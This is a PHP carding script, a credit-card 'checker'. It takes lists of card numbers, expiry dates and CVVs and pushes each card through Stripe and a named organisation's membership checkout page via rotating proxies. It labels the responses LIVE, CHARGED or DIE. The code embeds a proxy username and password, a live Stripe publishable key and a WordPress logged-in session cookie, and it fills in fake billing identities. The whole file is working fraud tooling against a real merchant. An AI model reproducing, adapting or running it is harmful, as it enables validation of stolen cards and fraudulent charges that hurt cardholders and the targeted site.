
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://jaxcc.org/membership-account-2/membership-checkout/?level=2" ;
$amt = "accept" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
/////////////===[Proxy]/////////////
$rp1 = array(
  1 => 'Rmp5VZndKa:4hfqqMS3Nh',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'http://45.152.161.236:8870',
  2 => 'http://45.92.217.254:8902',
  3 => 'http://45.92.217.31:9250',
  4 => 'http://45.95.175.210:8743',
  5 => 'http://45.151.57.161:9761',
  6 => 'http://45.151.56.198:6815',
  7 => 'http://45.92.219.137:5779',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "";
}
if (empty($ip1)){
$ip = "";
}
# --------------------[Proxy End]-----------------#

# -------------------- [1 REQ] -------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "$ip"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.5',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5649.221 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=146272&billing_details[address][line2]=&billing_details[address][city]=Montezuma&billing_details[address][state]=indiana&billing_details[address][postal_code]=47862&billing_details[address][country]=US&billing_details[name]=tac+cara&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8a050cc5-050d-45ad-b96a-79d56042a2a973a186&muid=fde419d9-a51d-44ef-8169-e81cd4ab02911d6f36&sid=45fff18a-d841-4987-a3b9-db3922647f6b8ae46d&pasted_fields=number&payment_user_agent=stripe.js%2F5d73d17adc%3B+stripe-js-v3%2F5d73d17adc&time_on_page=44190&key=pk_live_74xoS62Pi5J9jPQdKthAUf7u');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "$ip"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://jaxcc.org/membership-account-2/membership-checkout/?level=2');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: jaxcc.org',
'method: POST',
'path: /membership-account-2/membership-checkout/?level=2',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'accept-language: en-US,en;q=0.5',
'content-type: application/x-www-form-urlencoded',
'cookie: asp_transient_id=7631f233564c455d06fd46ed351e2345; PHPSESSID=07e720e9a02b5fa35fc44f81c90ddbfa; pmpro_visit=1; __stripe_mid=fde419d9-a51d-44ef-8169-e81cd4ab02911d6f36; __stripe_sid=45fff18a-d841-4987-a3b9-db3922647f6b8ae46d; wordpress_logged_in_e229b7ca44d53494e774d22d5ca6fcd4=taccara0%7C1688050847%7CXllFy5MdKOKoxW14S4aUlZElJgH2khXWCDrsfc58et7%7Cc7b140ec6bb18b260b959141f8411b5311f091694e302aed8b8c8acce9b24bb1',
'origin: https://jaxcc.org',
'referer: https://jaxcc.org/membership-account-2/membership-checkout/?level=2',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent:  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5649.221 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=2&checkjavascript=1&other_discount_code=&username='.$name.'&password=4430440030415343&password2=4430440030415343&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bfirstname=jonh&blastname=cena&baddress1=3324+Chapel+Street&baddress2=&bcity=Sugar+Land&bstate=Texas&bzipcode=77478&bcountry=US&bphone=281-624-2480&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX5745&ExpirationMonth=10&ExpirationYear=2025');



$result2 = curl_exec($ch);
# ---------------------------------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ '.$ip1.'</span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅checker '.$ip1.'  </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅checker '.$ip1.'  </span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅checker '.$ip1.'  </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: security code is incorrect ✅checker '.$ip1.'  </span><br>';
    exit;
    }
    elseif(strpos($result2, 'security code is invalid.')) {

        echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: security code is invalid ✅checker '.$ip1.'  </span><br>';
        exit;
        }
    elseif(strpos($result2, "Security code is incorrect")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect ✅checker '.$ip1.'  </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  transaction_not_allowed ✅checker '.$ip1.'   </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅checker '.$ip1.'   </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ '.$ip1.'</span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ '.$ip1.'</span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ '.$ip1.'</span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ '.$ip1.'</span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip1.'</span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip1.'</span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip1.'  </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your support!")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ✅checker '.$ip1.'   </span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip1.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip1.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED '.$ip1.' </span><br>';
exit;
}


else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ '.$ip1.'</span><br>';

}



curl_close($ch);
ob_flush();
#echo $result1;
#echo $result2; 
?>
